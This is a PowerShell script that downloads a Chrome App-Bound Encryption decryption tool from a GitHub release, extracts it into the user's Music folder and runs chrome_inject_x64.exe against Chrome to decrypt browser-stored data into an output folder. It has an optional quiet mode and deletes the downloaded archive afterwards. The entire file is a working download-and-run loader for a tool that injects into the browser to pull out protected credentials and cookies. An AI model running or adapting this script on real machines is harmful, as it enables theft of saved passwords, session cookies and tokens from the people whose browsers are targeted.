#Requires -Version 5.1
<#
.SYNOPSIS
    Efficient Chrome App-Bound Encryption Decryption Tool Installer
.DESCRIPTION
    Downloads, installs, and runs Chrome decryption tools with optimized performance and error handling
#>

[CmdletBinding()]
param(
    [switch]$SkipDownload,
    [switch]$Quiet
)

# Configuration
$ErrorActionPreference = "Stop"
$ProgressPreference = if ($Quiet) { "SilentlyContinue" } else { "Continue" }

# Constants
$URL = "https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption/releases/download/v0.14.2/chrome-injector-v0.14.2.zip"
$EXTRACT_PATH = "$env:USERPROFILE\Music\chrome_decryptor"
$ZIP_PATH = "$env:TEMP\chrome_decryptor_$(Get-Random).zip"
# This will be updated after extraction based on actual files
$INJECTOR_EXE = ""

function Write-Status {
    param([string]$Message)
    if (-not $Quiet) { Write-Host "[OK] $Message" -ForegroundColor Green }
}

function Test-ChromeRunning {
    return (Get-Process -Name "chrome" -ErrorAction SilentlyContinue) -ne $null
}

function Test-ToolsExist {
    return (Test-Path $INJECTOR_EXE)
}

try {
    # Ensure TLS 1.2 for secure downloads
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

    # Check if tools already exist and skip download if requested
    if ($SkipDownload -and (Test-ToolsExist)) {
        Write-Status "Tools already exist, skipping download"
    } else {
        # Warn if Chrome is running
        if (Test-ChromeRunning) {
            Write-Warning "Chrome is currently running. Consider closing it for better results."
        }

        Write-Status "Downloading Chrome decryption tools..."

        # Create extraction directory efficiently
        $null = New-Item -ItemType Directory -Path $EXTRACT_PATH -Force

        # Download with progress and better error handling
        $webClient = New-Object System.Net.WebClient
        try {
            $webClient.DownloadFile($URL, $ZIP_PATH)
            Write-Status "Download completed"
        } finally {
            $webClient.Dispose()
        }

        # Verify download
        if (-not (Test-Path $ZIP_PATH) -or (Get-Item $ZIP_PATH).Length -eq 0) {
            throw "Download failed or file is empty"
        }

        Write-Status "Extracting tools..."

        # Extract with overwrite
        Expand-Archive -Path $ZIP_PATH -DestinationPath $EXTRACT_PATH -Force

        # Debug: List extracted files
        Write-Status "Checking extracted files..."
        $extractedFiles = Get-ChildItem -Path $EXTRACT_PATH -Recurse -File
        if ($extractedFiles) {
            Write-Host "Found files:" -ForegroundColor Yellow
            $extractedFiles | ForEach-Object { Write-Host "  $($_.FullName)" -ForegroundColor Gray }
        } else {
            Write-Host "No files found in extraction directory!" -ForegroundColor Red
        }

        # Find the specific chrome_inject_x64.exe executable
        $allFiles = Get-ChildItem -Path $EXTRACT_PATH -Recurse -File
        $injectorFile = $allFiles | Where-Object { $_.Name -eq "chrome_inject_x64.exe" } | Select-Object -First 1

        if ($injectorFile) {
            $script:INJECTOR_EXE = $injectorFile.FullName
            Write-Status "Found chrome_inject_x64.exe: $($injectorFile.FullName)"
        }

        # Verify extraction - we specifically need chrome_inject_x64.exe
        if (-not $injectorFile) {
            Write-Host "Available files:" -ForegroundColor Yellow
            $allFiles | ForEach-Object { Write-Host "  $($_.Name)" -ForegroundColor Gray }
            throw "Extraction failed - chrome_inject_x64.exe not found."
        }

        Write-Status "Extraction completed"
    }

    Write-Status "Running Chrome injector..."

    # Change to extracted directory so injector can find encryptor.exe
    $originalLocation = Get-Location
    Set-Location -Path $EXTRACT_PATH
    
    try {
        # Run injector with chrome argument from the extracted directory
        Write-Host "Executing: ./chrome_inject_x64.exe chrome" -ForegroundColor Cyan
        Write-Host "Please wait for the decryption process to complete..." -ForegroundColor Yellow

        # Use cmd.exe to run the executable for better console interaction
        & cmd.exe /c "chrome_inject_x64.exe chrome"
        
        # Check if output directory was created
        $outputPath = Join-Path $EXTRACT_PATH "output"
        if (Test-Path $outputPath) {
            Write-Host "`n[SUCCESS] Decryption completed! Output saved to: $outputPath" -ForegroundColor Green
            
            # Show what was extracted
            $outputFiles = Get-ChildItem -Path $outputPath -Recurse -File
            if ($outputFiles) {
                Write-Host "Extracted files:" -ForegroundColor Cyan
                $outputFiles | ForEach-Object { Write-Host "  $($_.FullName)" -ForegroundColor Gray }
            }
        } else {
             Write-Host "`n[INFO] Decryption process finished. No output directory was created." -ForegroundColor Yellow
        }
        
    } finally {
        # Return to original directory
        Set-Location -Path $originalLocation
    }

    Write-Status "Tools launched successfully"
    Write-Host "`nTools location: $EXTRACT_PATH" -ForegroundColor Cyan

} catch {
    Write-Error "Error: $($_.Exception.Message)"
    exit 1
} finally {
    # Cleanup temporary files
    if (Test-Path $ZIP_PATH) {
        Remove-Item $ZIP_PATH -Force -ErrorAction SilentlyContinue
    }
}


